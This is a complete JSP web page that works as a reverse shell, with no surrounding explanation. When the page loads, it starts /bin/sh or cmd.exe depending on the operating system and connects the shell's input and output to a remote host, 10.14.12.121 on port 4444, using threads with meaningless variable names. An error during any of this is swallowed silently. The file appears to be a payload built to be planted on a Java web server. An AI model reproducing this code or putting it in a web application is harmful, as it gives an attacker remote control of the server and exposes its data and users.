<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream lh;
    OutputStream yp;

    StreamConnector( InputStream lh, OutputStream yp )
    {
      this.lh = lh;
      this.yp = yp;
    }

    public void run()
    {
      BufferedReader iu  = null;
      BufferedWriter mke = null;
      try
      {
        iu  = new BufferedReader( new InputStreamReader( this.lh ) );
        mke = new BufferedWriter( new OutputStreamWriter( this.yp ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = iu.read( buffer, 0, buffer.length ) ) > 0 )
        {
          mke.write( buffer, 0, length );
          mke.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( iu != null )
          iu.close();
        if( mke != null )
          mke.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.14.12.121", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
